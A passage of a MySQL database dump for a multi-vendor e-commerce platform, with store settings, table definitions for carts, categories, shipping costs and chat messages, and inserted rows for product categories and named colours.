(149,'react_setup','{\"status\":0,\"react_license_code\":\"\",\"react_domain\":\"\",\"react_platform\":\"\"}',NULL,'2024-01-09 04:05:15'),
(150,'app_activation','{\"software_id\":\"\",\"is_active\":0}',NULL,'2024-01-09 04:05:15'),
(151,'shop_banner','',NULL,'2023-10-13 11:34:53'),
(152,'map_api_status','1',NULL,'2024-03-27 03:12:32'),
(153,'vendor_registration_header','{\"title\":\"Vendor Registration\",\"sub_title\":\"Create your own store.Already have store?\",\"image\":\"\"}',NULL,NULL),
(154,'vendor_registration_sell_with_us','{\"title\":\"Why Sell With Us\",\"sub_title\":\"Boost your sales! Join us for a seamless, profitable experience with vast buyer reach and top-notch support. Sell smarter today!\",\"image\":\"\"}',NULL,NULL),
(155,'download_vendor_app','{\"title\":\"Download Free Vendor App\",\"sub_title\":\"Download our free seller app and start reaching millions of buyers on the go! Easy setup, manage listings, and boost sales anywhere.\",\"image\":null,\"download_google_app\":null,\"download_google_app_status\":0,\"download_apple_app\":null,\"download_apple_app_status\":0}',NULL,NULL),
(156,'business_process_main_section','{\"title\":\"3 Easy Steps To Start Selling\",\"sub_title\":\"Start selling quickly! Register, upload your products with detailed info and images, and reach millions of buyers instantly.\",\"image\":\"\"}',NULL,NULL),
(157,'business_process_step','[{\"title\":\"Get Registered\",\"description\":\"Sign up easily and create your seller account in just a few minutes. It fast and simple to get started.\",\"image\":\"\"},{\"title\":\"Upload Products\",\"description\":\"List your products with detailed descriptions and high-quality images to attract more buyers effortlessly.\",\"image\":\"\"},{\"title\":\"Start Selling\",\"description\":\"Go live and start reaching millions of potential buyers immediately. Watch your sales grow with our vast audience.\",\"image\":\"\"}]',NULL,NULL),
(158,'brand_list_priority','','2024-05-18 10:57:03','2024-05-18 10:57:03'),
(159,'category_list_priority','','2024-05-18 10:57:03','2024-05-18 10:57:03'),
(160,'vendor_list_priority','','2024-05-18 10:57:03','2024-05-18 10:57:03'),
(161,'flash_deal_priority','','2024-05-18 10:57:03','2024-05-18 10:57:03'),
(162,'featured_product_priority','','2024-05-18 10:57:03','2024-05-18 10:57:03'),
(163,'feature_deal_priority','','2024-05-18 10:57:03','2024-05-18 10:57:03'),
(164,'new_arrival_product_list_priority','','2024-05-18 10:57:03','2024-05-18 10:57:03'),
(165,'top_vendor_list_priority','','2024-05-18 10:57:03','2024-05-18 10:57:03'),
(166,'category_wise_product_list_priority','','2024-05-18 10:57:03','2024-05-18 10:57:03'),
(167,'top_rated_product_list_priority','','2024-05-18 10:57:03','2024-05-18 10:57:03'),
(168,'best_selling_product_list_priority','','2024-05-18 10:57:03','2024-05-18 10:57:03'),
(169,'searched_product_list_priority','','2024-05-18 10:57:03','2024-05-18 10:57:03'),
(170,'vendor_product_list_priority','','2024-05-18 10:57:03','2024-05-18 10:57:03'),
(171,'storage_connection_type','public','2024-09-24 07:52:17','2024-09-24 07:52:17'),
(172,'google_search_console_code','','2024-09-24 07:52:17','2024-09-24 07:52:17'),
(173,'bing_webmaster_code','','2024-09-24 07:52:17','2024-09-24 07:52:17'),
(174,'baidu_webmaster_code','','2024-09-24 07:52:17','2024-09-24 07:52:17'),
(175,'yandex_webmaster_code','','2024-09-24 07:52:17','2024-09-24 07:52:17'),
(176,'firebase_otp_verification','{\"status\":0,\"web_api_key\":\"\"}','2024-09-24 07:52:17','2024-09-24 07:52:17'),
(177,'maintenance_system_setup','{\"user_app\":0,\"user_website\":0,\"vendor_app\":0,\"deliveryman_app\":0,\"vendor_panel\":0}','2024-09-24 07:52:17','2024-09-24 07:52:17'),
(178,'maintenance_duration_setup','{\"maintenance_duration\":\"until_change\",\"start_date\":null,\"end_date\":null}',NULL,NULL),
(179,'maintenance_message_setup','{\"business_number\":1,\"business_email\":1,\"maintenance_message\":\"We are Working On Something Special\",\"message_body\":\"We apologize for any inconvenience. For immediate assistance, please contact with our support team\"}',NULL,NULL),
(181,'vendor_forgot_password_method','phone','2024-10-27 08:14:24','2024-10-27 08:14:24'),
(182,'deliveryman_forgot_password_method','phone','2024-10-27 08:14:24','2024-10-27 08:14:24'),
(183,'stock_clearance_product_list_priority','{\"custom_sorting_status\":0,\"sort_by\":\"latest_created\",\"out_of_stock_product\":\"hide\",\"temporary_close_sorting\":\"desc\"}','2025-02-13 08:41:39','2025-02-13 08:41:39'),
(184,'stock_clearance_vendor_priority','','2025-02-13 08:41:39','2025-02-13 08:41:39'),
(185,'setup_guide_requirements_for_admin','{\"general_setup\":0,\"shipping_method\":true,\"language_setup\":true,\"currency_setup\":true,\"customer_login\":0,\"google_map_apis\":0,\"notification_configuration\":0,\"digital_payment_setup\":0,\"offline_payment_setup\":0,\"category_setup\":true,\"brand_setup\":true,\"inhouse_shop_setup\":0,\"add_new_product\":0}','2025-05-11 07:50:11','2025-07-04 01:27:22'),
(186,'refund-policy','{\"status\":0,\"content\":\"\"}','2025-06-23 22:36:57','2025-06-23 22:36:57'),
(187,'return-policy','{\"status\":0,\"content\":\"\"}','2025-06-23 22:36:57','2025-06-23 22:36:57'),
(188,'cancellation-policy','{\"status\":0,\"content\":\"\"}','2025-06-23 22:36:57','2025-06-23 22:36:57'),
(189,'download_app_apple_store','{\"status\":0,\"link\":null}',NULL,'2025-07-05 16:03:42'),
(190,'download_app_google_store','{\"status\":0,\"link\":null}',NULL,'2025-07-05 16:03:42'),
(191,'default_location','{\"lat\":\"-33.8688\",\"lng\":\"151.2195\"}',NULL,'2025-07-05 16:03:42'),
(192,'timezone','Asia/Karachi',NULL,'2025-07-05 16:03:42'),
(193,'company_web_logo_png','{\"image_name\":\"2025-06-27-685e62d8ee1a6.png\",\"storage\":\"public\"}',NULL,'2025-06-27 14:22:32'),
(194,'loader_gif','{\"image_name\":\"2025-07-01-686374cce0ab4.gif\",\"storage\":\"public\"}',NULL,'2025-07-01 10:40:28');
/*!40000 ALTER TABLE `business_settings` ENABLE KEYS */;
UNLOCK TABLES;

--
-- Table structure for table `cart_shippings`
--

DROP TABLE IF EXISTS `cart_shippings`;
/*!40101 SET @saved_cs_client     = @@character_set_client */;
/*!40101 SET character_set_client = utf8mb4 */;
CREATE TABLE `cart_shippings` (
  `id` bigint(20) unsigned NOT NULL AUTO_INCREMENT,
  `cart_group_id` varchar(191) DEFAULT NULL,
  `shipping_method_id` bigint(20) DEFAULT NULL,
  `shipping_cost` double(8,2) NOT NULL DEFAULT 0.00,
  `created_at` timestamp NULL DEFAULT NULL,
  `updated_at` timestamp NULL DEFAULT NULL,
  PRIMARY KEY (`id`)
) ENGINE=InnoDB AUTO_INCREMENT=2 DEFAULT CHARSET=utf8mb4 COLLATE=utf8mb4_unicode_ci;
/*!40101 SET character_set_client = @saved_cs_client */;

--
-- Dumping data for table `cart_shippings`
--

LOCK TABLES `cart_shippings` WRITE;
/*!40000 ALTER TABLE `cart_shippings` DISABLE KEYS */;
/*!40000 ALTER TABLE `cart_shippings` ENABLE KEYS */;
UNLOCK TABLES;

--
-- Table structure for table `carts`
--

DROP TABLE IF EXISTS `carts`;
/*!40101 SET @saved_cs_client     = @@character_set_client */;
/*!40101 SET character_set_client = utf8mb4 */;
CREATE TABLE `carts` (
  `id` bigint(20) unsigned NOT NULL AUTO_INCREMENT,
  `customer_id` bigint(20) DEFAULT NULL,
  `cart_group_id` varchar(191) DEFAULT NULL,
  `product_id` bigint(20) DEFAULT NULL,
  `product_type` varchar(20) NOT NULL DEFAULT 'physical',
  `digital_product_type` varchar(30) DEFAULT NULL,
  `color` varchar(191) DEFAULT NULL,
  `choices` text DEFAULT NULL,
  `variations` text DEFAULT NULL,
  `variant` text DEFAULT NULL,
  `quantity` int(11) NOT NULL DEFAULT 1,
  `price` double NOT NULL DEFAULT 1,
  `tax` double NOT NULL DEFAULT 1,
  `discount` double NOT NULL DEFAULT 1,
  `tax_model` varchar(20) NOT NULL DEFAULT 'exclude',
  `is_checked` tinyint(1) NOT NULL DEFAULT 0,
  `slug` varchar(191) DEFAULT NULL,
  `name` varchar(191) DEFAULT NULL,
  `thumbnail` varchar(191) DEFAULT NULL,
  `seller_id` bigint(20) DEFAULT NULL,
  `seller_is` varchar(191) NOT NULL DEFAULT 'admin',
  `created_at` timestamp NULL DEFAULT NULL,
  `updated_at` timestamp NULL DEFAULT NULL,
  `shop_info` varchar(191) DEFAULT NULL,
  `shipping_cost` double(8,2) DEFAULT NULL,
  `shipping_type` varchar(191) DEFAULT NULL,
  `is_guest` tinyint(4) NOT NULL DEFAULT 0,
  PRIMARY KEY (`id`)
) ENGINE=InnoDB AUTO_INCREMENT=2 DEFAULT CHARSET=utf8mb4 COLLATE=utf8mb4_unicode_ci;
/*!40101 SET character_set_client = @saved_cs_client */;

--
-- Dumping data for table `carts`
--

LOCK TABLES `carts` WRITE;
/*!40000 ALTER TABLE `carts` DISABLE KEYS */;
/*!40000 ALTER TABLE `carts` ENABLE KEYS */;
UNLOCK TABLES;

--
-- Table structure for table `categories`
--

DROP TABLE IF EXISTS `categories`;
/*!40101 SET @saved_cs_client     = @@character_set_client */;
/*!40101 SET character_set_client = utf8mb4 */;
CREATE TABLE `categories` (
  `id` bigint(20) unsigned NOT NULL AUTO_INCREMENT,
  `name` varchar(100) NOT NULL,
  `slug` varchar(100) NOT NULL,
  `icon` varchar(250) DEFAULT NULL,
  `icon_storage_type` varchar(10) DEFAULT 'public',
  `parent_id` int(11) NOT NULL,
  `position` int(11) NOT NULL,
  `created_at` timestamp NULL DEFAULT NULL,
  `updated_at` timestamp NULL DEFAULT NULL,
  `home_status` tinyint(1) NOT NULL DEFAULT 0,
  `priority` int(11) DEFAULT NULL,
  PRIMARY KEY (`id`)
) ENGINE=InnoDB AUTO_INCREMENT=37 DEFAULT CHARSET=utf8mb4 COLLATE=utf8mb4_unicode_ci;
/*!40101 SET character_set_client = @saved_cs_client */;

--
-- Dumping data for table `categories`
--

LOCK TABLES `categories` WRITE;
/*!40000 ALTER TABLE `categories` DISABLE KEYS */;
INSERT INTO `categories` VALUES
(1,'Smartphones and Gadgets','smartphones-and-gadgets','2025-07-01-686389f46fa69.webp','public',0,0,'2025-07-01 12:10:44','2025-07-01 12:10:44',1,NULL),
(2,'Laptops and Computers','laptops-and-computers','2025-07-01-686389f8c197b.webp','public',0,0,'2025-07-01 12:10:48','2025-07-01 12:10:48',1,NULL),
(3,'TVs and Digital TV','tvs-and-digital-tv','2025-07-01-686389fb60c4a.webp','public',0,0,'2025-07-01 12:10:51','2025-07-01 12:10:51',1,NULL),
(4,'Kitchen Appliances','kitchen-appliances','2025-07-01-686389fe01d13.webp','public',0,0,'2025-07-01 12:10:54','2025-07-01 12:10:54',1,NULL),
(5,'Home Appliances','home-appliances','2025-07-01-68638a0d12ab4.webp','public',0,0,'2025-07-01 12:11:09','2025-07-01 12:11:09',1,NULL),
(6,'Beauty and Health','beauty-and-health','2025-07-01-68638a119974b.webp','public',0,0,'2025-07-01 12:11:13','2025-07-01 12:11:13',1,NULL),
(7,'Games and Software','games-and-software','2025-07-01-68638a14a14d1.webp','public',0,0,'2025-07-01 12:11:16','2025-07-01 12:11:16',1,NULL),
(19,'Smartphones','smartphones','def.png',NULL,1,1,'2025-07-01 12:57:07','2025-07-01 12:57:07',1,NULL),
(20,'Tablets','tablets','def.png',NULL,1,1,'2025-07-01 12:57:20','2025-07-01 12:57:20',1,NULL),
(21,'Smartwatches and Fitness Trackers','smartwatches-and-fitness-trackers','def.png',NULL,1,1,'2025-07-01 12:57:34','2025-07-01 12:57:34',1,NULL),
(22,'Laptops','laptops','def.png',NULL,2,1,'2025-07-01 12:57:45','2025-07-01 12:57:45',1,NULL),
(23,'Desktops and All-in-Ones','desktops-and-all-in-ones','def.png',NULL,2,1,'2025-07-01 12:58:00','2025-07-01 12:58:00',1,NULL),
(24,'PC Components','pc-components','def.png',NULL,2,1,'2025-07-01 12:58:11','2025-07-01 12:58:11',1,NULL),
(25,'Printers and MFPs','printers-and-mfps','def.png',NULL,2,1,'2025-07-01 12:58:19','2025-07-01 12:58:19',1,NULL),
(26,'TVs','tvs','def.png',NULL,3,1,'2025-07-01 12:58:28','2025-07-01 12:58:28',1,NULL),
(27,'Home Theaters and Soundbars','home-theaters-and-soundbars','def.png',NULL,3,1,'2025-07-01 12:58:44','2025-07-01 12:58:44',1,NULL),
(28,'TV Accessories','tv-accessories','def.png',NULL,3,1,'2025-07-01 12:58:56','2025-07-01 12:58:56',1,NULL),
(29,'Refrigerators','refrigerators','def.png',NULL,4,1,'2025-07-01 12:59:09','2025-07-01 12:59:09',1,NULL),
(30,'Microwave Ovens','microwave-ovens','def.png',NULL,4,1,'2025-07-01 12:59:56','2025-07-01 12:59:56',1,NULL),
(31,'Coffee Machines and Coffee Makers','coffee-machines-and-coffee-makers','def.png',NULL,4,1,'2025-07-01 13:00:07','2025-07-01 13:00:07',1,NULL),
(32,'Blenders and Mixers','blenders-and-mixers','def.png',NULL,4,1,'2025-07-01 13:00:18','2025-07-01 13:00:18',1,NULL),
(33,'Washing Machines','washing-machines','def.png',NULL,5,1,'2025-07-01 13:00:26','2025-07-01 13:00:26',1,NULL),
(34,'Vacuum Cleaners','vacuum-cleaners','def.png',NULL,5,1,'2025-07-01 13:00:34','2025-07-01 13:00:34',1,NULL),
(35,'Irons','irons','def.png',NULL,5,1,'2025-07-01 13:00:44','2025-07-01 13:00:44',1,NULL),
(36,'Hair Dryers and Stylers','hair-dryers-and-stylers','def.png',NULL,6,1,'2025-07-01 13:00:56','2025-07-01 13:00:56',1,NULL);
/*!40000 ALTER TABLE `categories` ENABLE KEYS */;
UNLOCK TABLES;

--
-- Table structure for table `category_shipping_costs`
--

DROP TABLE IF EXISTS `category_shipping_costs`;
/*!40101 SET @saved_cs_client     = @@character_set_client */;
/*!40101 SET character_set_client = utf8mb4 */;
CREATE TABLE `category_shipping_costs` (
  `id` bigint(20) unsigned NOT NULL AUTO_INCREMENT,
  `seller_id` bigint(20) unsigned DEFAULT NULL,
  `category_id` int(10) unsigned DEFAULT NULL,
  `cost` double(8,2) DEFAULT NULL,
  `multiply_qty` tinyint(1) DEFAULT NULL,
  `created_at` timestamp NULL DEFAULT NULL,
  `updated_at` timestamp NULL DEFAULT NULL,
  PRIMARY KEY (`id`)
) ENGINE=InnoDB AUTO_INCREMENT=8 DEFAULT CHARSET=utf8mb4 COLLATE=utf8mb4_unicode_ci;
/*!40101 SET character_set_client = @saved_cs_client */;

--
-- Dumping data for table `category_shipping_costs`
--

LOCK TABLES `category_shipping_costs` WRITE;
/*!40000 ALTER TABLE `category_shipping_costs` DISABLE KEYS */;
INSERT INTO `category_shipping_costs` VALUES
(1,0,1,0.00,NULL,'2025-07-01 17:52:49','2025-07-01 17:52:49'),
(2,0,2,0.00,NULL,'2025-07-01 17:52:49','2025-07-01 17:52:49'),
(3,0,3,0.00,NULL,'2025-07-01 17:52:49','2025-07-01 17:52:49'),
(4,0,4,0.00,NULL,'2025-07-01 17:52:49','2025-07-01 17:52:49'),
(5,0,5,0.00,NULL,'2025-07-01 17:52:49','2025-07-01 17:52:49'),
(6,0,6,0.00,NULL,'2025-07-01 17:52:49','2025-07-01 17:52:49'),
(7,0,7,0.00,NULL,'2025-07-01 17:52:49','2025-07-01 17:52:49');
/*!40000 ALTER TABLE `category_shipping_costs` ENABLE KEYS */;
UNLOCK TABLES;

--
-- Table structure for table `chattings`
--

DROP TABLE IF EXISTS `chattings`;
/*!40101 SET @saved_cs_client     = @@character_set_client */;
/*!40101 SET character_set_client = utf8mb4 */;
CREATE TABLE `chattings` (
  `id` bigint(20) unsigned NOT NULL AUTO_INCREMENT,
  `user_id` bigint(20) DEFAULT NULL,
  `seller_id` bigint(20) DEFAULT NULL,
  `admin_id` bigint(20) DEFAULT NULL,
  `delivery_man_id` bigint(20) DEFAULT NULL,
  `message` text DEFAULT NULL,
  `attachment` longtext CHARACTER SET utf8mb4 COLLATE utf8mb4_bin DEFAULT NULL CHECK (json_valid(`attachment`)),
  `sent_by_customer` tinyint(1) NOT NULL DEFAULT 0,
  `sent_by_seller` tinyint(1) NOT NULL DEFAULT 0,
  `sent_by_admin` tinyint(1) DEFAULT NULL,
  `sent_by_delivery_man` tinyint(1) DEFAULT NULL,
  `seen_by_customer` tinyint(1) NOT NULL DEFAULT 1,
  `seen_by_seller` tinyint(1) NOT NULL DEFAULT 1,
  `seen_by_admin` tinyint(1) DEFAULT NULL,
  `seen_by_delivery_man` tinyint(1) DEFAULT NULL,
  `status` tinyint(1) NOT NULL DEFAULT 1,
  `notification_receiver` varchar(20) DEFAULT NULL COMMENT 'admin, seller, customer, deliveryman',
  `seen_notification` tinyint(1) DEFAULT 0,
  `created_at` timestamp NULL DEFAULT NULL,
  `updated_at` timestamp NULL DEFAULT NULL,
  `shop_id` bigint(20) DEFAULT NULL,
  PRIMARY KEY (`id`)
) ENGINE=InnoDB DEFAULT CHARSET=utf8mb4 COLLATE=utf8mb4_unicode_ci;
/*!40101 SET character_set_client = @saved_cs_client */;

--
-- Dumping data for table `chattings`
--

LOCK TABLES `chattings` WRITE;
/*!40000 ALTER TABLE `chattings` DISABLE KEYS */;
/*!40000 ALTER TABLE `chattings` ENABLE KEYS */;
UNLOCK TABLES;

--
-- Table structure for table `colors`
--

DROP TABLE IF EXISTS `colors`;
/*!40101 SET @saved_cs_client     = @@character_set_client */;
/*!40101 SET character_set_client = utf8mb4 */;
CREATE TABLE `colors` (
  `id` int(11) NOT NULL AUTO_INCREMENT,
  `name` varchar(30) DEFAULT NULL,
  `code` varchar(10) DEFAULT NULL,
  `created_at` timestamp NOT NULL DEFAULT current_timestamp(),
  `updated_at` timestamp NOT NULL DEFAULT current_timestamp(),
  PRIMARY KEY (`id`)
) ENGINE=InnoDB AUTO_INCREMENT=144 DEFAULT CHARSET=utf8mb3 COLLATE=utf8mb3_unicode_ci;
/*!40101 SET character_set_client = @saved_cs_client */;

--
-- Dumping data for table `colors`
--

LOCK TABLES `colors` WRITE;
/*!40000 ALTER TABLE `colors` DISABLE KEYS */;
INSERT INTO `colors` VALUES
(1,'IndianRed','#CD5C5C','2018-11-05 02:12:26','2018-11-05 02:12:26'),
(2,'LightCoral','#F08080','2018-11-05 02:12:26','2018-11-05 02:12:26'),
(3,'Salmon','#FA8072','2018-11-05 02:12:26','2018-11-05 02:12:26'),
(4,'DarkSalmon','#E9967A','2018-11-05 02:12:26','2018-11-05 02:12:26'),
(5,'LightSalmon','#FFA07A','2018-11-05 02:12:26','2018-11-05 02:12:26'),
(6,'Crimson','#DC143C','2018-11-05 02:12:26','2018-11-05 02:12:26'),
(7,'Red','#FF0000','2018-11-05 02:12:26','2018-11-05 02:12:26'),
(8,'FireBrick','#B22222','2018-11-05 02:12:26','2018-11-05 02:12:26'),
(9,'DarkRed','#8B0000','2018-11-05 02:12:26','2018-11-05 02:12:26'),
(10,'Pink','#FFC0CB','2018-11-05 02:12:26','2018-11-05 02:12:26'),
(11,'LightPink','#FFB6C1','2018-11-05 02:12:26','2018-11-05 02:12:26'),
(12,'HotPink','#FF69B4','2018-11-05 02:12:26','2018-11-05 02:12:26'),
(13,'DeepPink','#FF1493','2018-11-05 02:12:26','2018-11-05 02:12:26'),
(14,'MediumVioletRed','#C71585','2018-11-05 02:12:26','2018-11-05 02:12:26'),
(15,'PaleVioletRed','#DB7093','2018-11-05 02:12:26','2018-11-05 02:12:26'),
(17,'Coral','#FF7F50','2018-11-05 02:12:26','2018-11-05 02:12:26'),
(18,'Tomato','#FF6347','2018-11-05 02:12:26','2018-11-05 02:12:26'),
(19,'OrangeRed','#FF4500','2018-11-05 02:12:26','2018-11-05 02:12:26'),
(20,'DarkOrange','#FF8C00','2018-11-05 02:12:26','2018-11-05 02:12:26'),
(21,'Orange','#FFA500','2018-11-05 02:12:26','2018-11-05 02:12:26'),
(22,'Gold','#FFD700','2018-11-05 02:12:26','2018-11-05 02:12:26'),
(23,'Yellow','#FFFF00','2018-11-05 02:12:26','2018-11-05 02:12:26'),
(24,'LightYellow','#FFFFE0','2018-11-05 02:12:26','2018-11-05 02:12:26'),
(25,'LemonChiffon','#FFFACD','2018-11-05 02:12:26','2018-11-05 02:12:26'),
(26,'LightGoldenrodYellow','#FAFAD2','2018-11-05 02:12:27','2018-11-05 02:12:27'),
(27,'PapayaWhip','#FFEFD5','2018-11-05 02:12:27','2018-11-05 02:12:27'),
(28,'Moccasin','#FFE4B5','2018-11-05 02:12:27','2018-11-05 02:12:27'),
(29,'PeachPuff','#FFDAB9','2018-11-05 02:12:27','2018-11-05 02:12:27'),
(30,'PaleGoldenrod','#EEE8AA','2018-11-05 02:12:27','2018-11-05 02:12:27'),
(31,'Khaki','#F0E68C','2018-11-05 02:12:27','2018-11-05 02:12:27'),
(32,'DarkKhaki','#BDB76B','2018-11-05 02:12:27','2018-11-05 02:12:27'),
(33,'Lavender','#E6E6FA','2018-11-05 02:12:27','2018-11-05 02:12:27'),
(34,'Thistle','#D8BFD8','2018-11-05 02:12:27','2018-11-05 02:12:27'),
(35,'Plum','#DDA0DD','2018-11-05 02:12:27','2018-11-05 02:12:27'),
(36,'Violet','#EE82EE','2018-11-05 02:12:27','2018-11-05 02:12:27'),
(37,'Orchid','#DA70D6','2018-11-05 02:12:27','2018-11-05 02:12:27'),
(39,'Magenta','#FF00FF','2018-11-05 02:12:27','2018-11-05 02:12:27'),
(40,'MediumOrchid','#BA55D3','2018-11-05 02:12:27','2018-11-05 02:12:27'),
(41,'MediumPurple','#9370DB','2018-11-05 02:12:27','2018-11-05 02:12:27'),
(42,'Amethyst','#9966CC','2018-11-05 02:12:27','2018-11-05 02:12:27'),
(43,'BlueViolet','#8A2BE2','2018-11-05 02:12:27','2018-11-05 02:12:27'),
(44,'DarkViolet','#9400D3','2018-11-05 02:12:27','2018-11-05 02:12:27'),
(45,'DarkOrchid','#9932CC','2018-11-05 02:12:27','2018-11-05 02:12:27'),
(46,'DarkMagenta','#8B008B','2018-11-05 02:12:27','2018-11-05 02:12:27'),
(47,'Purple','#800080','2018-11-05 02:12:27','2018-11-05 02:12:27'),
(48,'Indigo','#4B0082','2018-11-05 02:12:27','2018-11-05 02:12:27'),
(49,'SlateBlue','#6A5ACD','2018-11-05 02:12:27','2018-11-05 02:12:27'),
(50,'DarkSlateBlue','#483D8B','2018-11-05 02:12:27','2018-11-05 02:12:27'),
(51,'MediumSlateBlue','#7B68EE','2018-11-05 02:12:27','2018-11-05 02:12:27'),
(52,'GreenYellow','#ADFF2F','2018-11-05 02:12:27','2018-11-05 02:12:27'),
(53,'Chartreuse','#7FFF00','2018-11-05 02:12:27','2018-11-05 02:12:27'),
(54,'LawnGreen','#7CFC00','2018-11-05 02:12:27','2018-11-05 02:12:27'),
(55,'Lime','#00FF00','2018-11-05 02:12:27','2018-11-05 02:12:27'),
(56,'LimeGreen','#32CD32','2018-11-05 02:12:27','2018-11-05 02:12:27'),
(57,'PaleGreen','#98FB98','2018-11-05 02:12:27','2018-11-05 02:12:27'),
(58,'LightGreen','#90EE90','2018-11-05 02:12:27','2018-11-05 02:12:27'),
(59,'MediumSpringGreen','#00FA9A','2018-11-05 02:12:27','2018-11-05 02:12:27'),
(60,'SpringGreen','#00FF7F','2018-11-05 02:12:27','2018-11-05 02:12:27'),
(61,'MediumSeaGreen','#3CB371','2018-11-05 02:12:27','2018-11-05 02:12:27'),
(62,'SeaGreen','#2E8B57','2018-11-05 02:12:27','2018-11-05 02:12:27'),
(63,'ForestGreen','#228B22','2018-11-05 02:12:28','2018-11-05 02:12:28'),
(64,'Green','#008000','2018-11-05 02:12:28','2018-11-05 02:12:28'),
(65,'DarkGreen','#006400','2018-11-05 02:12:28','2018-11-05 02:12:28'),
(66,'YellowGreen','#9ACD32','2018-11-05 02:12:28','2018-11-05 02:12:28'),
(67,'OliveDrab','#6B8E23','2018-11-05 02:12:28','2018-11-05 02:12:28'),
(68,'Olive','#808000','2018-11-05 02:12:28','2018-11-05 02:12:28'),
(69,'DarkOliveGreen','#556B2F','2018-11-05 02:12:28','2018-11-05 02:12:28'),
(70,'MediumAquamarine','#66CDAA','2018-11-05 02:12:28','2018-11-05 02:12:28'),
(71,'DarkSeaGreen','#8FBC8F','2018-11-05 02:12:28','2018-11-05 02:12:28'),
(72,'LightSeaGreen','#20B2AA','2018-11-05 02:12:28','2018-11-05 02:12:28'),
(73,'DarkCyan','#008B8B','2018-11-05 02:12:28','2018-11-05 02:12:28'),
(74,'Teal','#008080','2018-11-05 02:12:28','2018-11-05 02:12:28'),
(75,'Aqua','#00FFFF','2018-11-05 02:12:28','2018-11-05 02:12:28'),
(77,'LightCyan','#E0FFFF','2018-11-05 02:12:28','2018-11-05 02:12:28'),
(78,'PaleTurquoise','#AFEEEE','2018-11-05 02:12:28','2018-11-05 02:12:28'),
(79,'Aquamarine','#7FFFD4','2018-11-05 02:12:28','2018-11-05 02:12:28'),
(80,'Turquoise','#40E0D0','2018-11-05 02:12:28','2018-11-05 02:12:28'),
(81,'MediumTurquoise','#48D1CC','2018-11-05 02:12:28','2018-11-05 02:12:28'),
(82,'DarkTurquoise','#00CED1','2018-11-05 02:12:28','2018-11-05 02:12:28'),
(83,'CadetBlue','#5F9EA0','2018-11-05 02:12:28','2018-11-05 02:12:28'),
(84,'SteelBlue','#4682B4','2018-11-05 02:12:28','2018-11-05 02:12:28'),
(85,'LightSteelBlue','#B0C4DE','2018-11-05 02:12:28','2018-11-05 02:12:28'),
(86,'PowderBlue','#B0E0E6','2018-11-05 02:12:28','2018-11-05 02:12:28'),
(87,'LightBlue','#ADD8E6','2018-11-05 02:12:28','2018-11-05 02:12:28'),
(88,'SkyBlue','#87CEEB','2018-11-05 02:12:28','2018-11-05 02:12:28'),
(89,'LightSkyBlue','#87CEFA','2018-11-05 02:12:28','2018-11-05 02:12:28'),
(90,'DeepSkyBlue','#00BFFF','2018-11-05 02:12:28','2018-11-05 02:12:28'),
(91,'DodgerBlue','#1E90FF','2018-11-05 02:12:28','2018-11-05 02:12:28'),
(92,'CornflowerBlue','#6495ED','2018-11-05 02:12:28','2018-11-05 02:12:28'),
(94,'RoyalBlue','#4169E1','2018-11-05 02:12:28','2018-11-05 02:12:28'),
(95,'Blue','#0000FF','2018-11-05 02:12:28','2018-11-05 02:12:28'),
(96,'MediumBlue','#0000CD','2018-11-05 02:12:28','2018-11-05 02:12:28'),
(97,'DarkBlue','#00008B','2018-11-05 02:12:28','2018-11-05 02:12:28'),
(98,'Navy','#000080','2018-11-05 02:12:28','2018-11-05 02:12:28'),
(99,'MidnightBlue','#191970','2018-11-05 02:12:29','2018-11-05 02:12:29'),
(100,'Cornsilk','#FFF8DC','2018-11-05 02:12:29','2018-11-05 02:12:29'),
(101,'BlanchedAlmond','#FFEBCD','2018-11-05 02:12:29','2018-11-05 02:12:29'),
(102,'Bisque','#FFE4C4','2018-11-05 02:12:29','2018-11-05 02:12:29'),
(103,'NavajoWhite','#FFDEAD','2018-11-05 02:12:29','2018-11-05 02:12:29'),
(104,'Wheat','#F5DEB3','2018-11-05 02:12:29','2018-11-05 02:12:29'),
(105,'BurlyWood','#DEB887','2018-11-05 02:12:29','2018-11-05 02:12:29'),
(106,'Tan','#D2B48C','2018-11-05 02:12:29','2018-11-05 02:12:29'),
(107,'RosyBrown','#BC8F8F','2018-11-05 02:12:29','2018-11-05 02:12:29'),
(108,'SandyBrown','#F4A460','2018-11-05 02:12:29','2018-11-05 02:12:29'),
(109,'Goldenrod','#DAA520','2018-11-05 02:12:29','2018-11-05 02:12:29'),
(110,'DarkGoldenrod','#B8860B','2018-11-05 02:12:29','2018-11-05 02:12:29'),
(111,'Peru','#CD853F','2018-11-05 02:12:29','2018-11-05 02:12:29'),
(112,'Chocolate','#D2691E','2018-11-05 02:12:29','2018-11-05 02:12:29'),
(113,'SaddleBrown','#8B4513','2018-11-05 02:12:29','2018-11-05 02:12:29'),
(114,'Sienna','#A0522D','2018-11-05 02:12:29','2018-11-05 02:12:29'),
(115,'Brown','#A52A2A','2018-11-05 02:12:29','2018-11-05 02:12:29'),
(116,'Maroon','#800000','2018-11-05 02:12:29','2018-11-05 02:12:29'),
(117,'White','#FFFFFF','2018-11-05 02:12:29','2018-11-05 02:12:29'),
(118,'Snow','#FFFAFA','2018-11-05 02:12:29','2018-11-05 02:12:29'),
(119,'Honeydew','#F0FFF0','2018-11-05 02:12:29','2018-11-05 02:12:29'),
(120,'MintCream','#F5FFFA','2018-11-05 02:12:29','2018-11-05 02:12:29'),
(121,'Azure','#F0FFFF','2018-11-05 02:12:29','2018-11-05 02:12:29'),
(122,'AliceBlue','#F0F8FF','2018-11-05 02:12:29','2018-11-05 02:12:29'),
(123,'GhostWhite','#F8F8FF','2018-11-05 02:12:29','2018-11-05 02:12:29'),
(124,'WhiteSmoke','#F5F5F5','2018-11-05 02:12:29','2018-11-05 02:12:29'),
(125,'Seashell','#FFF5EE','2018-11-05 02:12:29','2018-11-05 02:12:29'),
(126,'Beige','#F5F5DC','2018-11-05 02:12:29','2018-11-05 02:12:29'),
(127,'OldLace','#FDF5E6','2018-11-05 02:12:29','2018-11-05 02:12:29'),
(128,'FloralWhite','#FFFAF0','2018-11-05 02:12:29','2018-11-05 02:12:29'),
(129,'Ivory','#FFFFF0','2018-11-05 02:12:30','2018-11-05 02:12:30'),
(130,'AntiqueWhite','#FAEBD7','2018-11-05 02:12:30','2018-11-05 02:12:30'),
(131,'Linen','#FAF0E6','2018-11-05 02:12:30','2018-11-05 02:12:30'),
(132,'LavenderBlush','#FFF0F5','2018-11-05 02:12:30','2018-11-05 02:12:30'),
(133,'MistyRose','#FFE4E1','2018-11-05 02:12:30','2018-11-05 02:12:30'),
(134,'Gainsboro','#DCDCDC','2018-11-05 02:12:30','2018-11-05 02:12:30'),
